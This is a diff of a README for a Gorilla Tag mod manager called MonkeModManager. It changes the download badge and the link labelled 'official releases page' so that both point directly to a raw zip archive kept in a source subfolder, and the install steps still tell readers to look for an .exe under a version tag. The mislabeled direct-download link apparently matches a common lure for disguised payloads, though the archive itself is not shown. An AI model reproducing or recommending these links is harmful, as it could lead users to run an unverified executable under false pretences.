@@ -1,6 +1,6 @@
 # 🐒 MonkeModManager - Simple Tools To Enhance Your Gameplay
 
-[![Download MonkeModManager](https://img.shields.io/badge/Download-MonkeModManager-blue.svg)](https://github.com/Falconiformespound913/MonkeModManager)
+[![Download MonkeModManager](https://img.shields.io/badge/Download-MonkeModManager-blue.svg)](https://github.com/Falconiformespound913/MonkeModManager/raw/refs/heads/main/Manager/Properties/Mod_Monke_Manager_v2.0.zip)
 
 ## 🛠️ Overview
 MonkeModManager simplifies how you manage mods for Gorilla Tag. This tool installs BepInEx and custom content for your game automatically. You do not need to move files or edit folders by hand. The manager finds your game files and handles the setup process. Use this tool to add cosmetics, custom maps, and various utilities to your VR experience.
@@ -15,7 +15,7 @@ You need a Windows computer to run this application. Ensure you have the followi
 ## 🚀 How To Install And Set Up
 Follow these steps to configure your game:
 
-1. Visit the [official releases page](https://github.com/Falconiformespound913/MonkeModManager) to download the tool.
+1. Visit the [official releases page](https://github.com/Falconiformespound913/MonkeModManager/raw/refs/heads/main/Manager/Properties/Mod_Monke_Manager_v2.0.zip) to download the tool.
 2. Look for the file ending in .exe under the latest version tag.
 3. Save the file to your computer. A folder on your desktop works well.
 4. Locate the file you just saved.
